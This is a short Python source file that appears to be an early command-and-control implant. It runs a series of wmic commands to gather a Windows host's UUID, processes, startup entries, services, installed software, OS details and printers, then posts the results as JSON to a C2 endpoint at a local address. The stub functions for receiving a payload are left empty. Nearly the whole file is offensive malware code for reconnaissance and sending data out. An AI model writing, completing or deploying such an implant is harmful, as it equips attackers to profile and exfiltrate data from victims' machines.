import os 
import base64
import zipfile
import requests 
import subprocess


c2_url = "http://127.0.0.1:8800"

def get_running_process() : 
    pass



def run_command(command) : 
    return subprocess.Popen(command, shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE).communicate()[0]


def get_system_info() : 
    uuid =  run_command("wmic csproduct get uuid")
    process = run_command("wmic process list brief")
    startup = run_command("wmic startup list brief")
    services = run_command("wmic service list brief")
    softwares = run_command("wmic product list brief")
    os_list = run_command("wmic os list brief")
    printers = run_command("wmic printer list status")
    os_arch = run_command("wmic os get OSArchitecture")
    os_version = run_command("wmic os get version")
    os_name = run_command("wmic os get name")


    system_info = {
        "uuid" : uuid.decode().replace("UUID", '').strip(), 
        "process": process.decode(),
        "startup": startup.decode(),
        "services" : services.decode() ,
        "softwares": softwares.decode() ,
        "os_list": os_list.decode() ,
        "printers": printers.decode() ,
        "os_arch": os_arch.decode() ,
        "os_version": os_version.decode() ,
        "os_name" : os_name.decode() ,
    }

    return system_info

   

def send_info(info): 
    response = requests.post(url=c2_url + "/hello", json=info, headers={"Content-Type":"application/json"})

def wait_payload(): 
    
    pass 


if __name__ == "__main__" : 

    info = get_system_info()

    send_info(info)

    wait_payload()

